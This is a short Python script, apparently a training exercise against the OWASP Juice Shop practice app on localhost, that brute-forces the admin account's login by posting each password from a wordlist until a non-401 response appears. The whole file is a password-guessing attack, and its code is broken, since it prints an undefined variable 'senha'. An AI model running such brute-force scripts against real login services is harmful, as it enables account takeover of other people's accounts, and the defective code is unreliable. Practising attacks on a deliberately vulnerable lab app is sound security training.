import requests

url = "http://localhost:3000/rest/user/login"

params = {"email":"admin@juice-sh.op","password":""}

wordlist = open("wordlist-nova.txt", "r")

linhas = wordlist.readlines()

for index, line in enumerate(linhas):
    print(line)
    params["password"] = line.rstrip("\n")

    tentativa_login = requests.post(url,params)
    print("Tentativa {}, Senha: {}".format(index, senha))
    if tentativa_login.status_code != 401:
        print("Achei a senha: {}".format(senha))
        break







